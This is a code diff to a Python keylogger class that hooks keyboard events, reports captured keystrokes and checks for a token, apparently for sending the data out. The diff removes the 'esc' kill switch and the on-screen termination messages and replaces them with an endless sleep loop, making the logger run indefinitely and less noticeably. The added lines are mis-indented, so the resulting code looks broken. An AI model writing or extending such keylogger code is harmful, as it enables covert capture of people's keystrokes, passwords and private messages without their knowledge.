@@ -166,17 +166,10 @@ class Keylogger:
         keyboard.on_release(callback=self.callback)
         self.report()
         
-        # Keep the program running
-        try:
-            keyboard.wait('esc')
-        except KeyboardInterrupt:
-            pass
-            
-        print(f"\n{'='*50}")
-        print("Session terminated")
-        print(f"Final update at {datetime.now()}")
-        print(f"{'='*50}")
-        input("Press Enter to close this window...")
+        # REPLACE THE kill switch CODE WITH THIS:
+# Keep the program running indefinitely
+while True:
+    time.sleep(60)  # Just sleep forever, waking up once a minute to do nothing
 
 if __name__ == "__main__":
     # Verify token exists
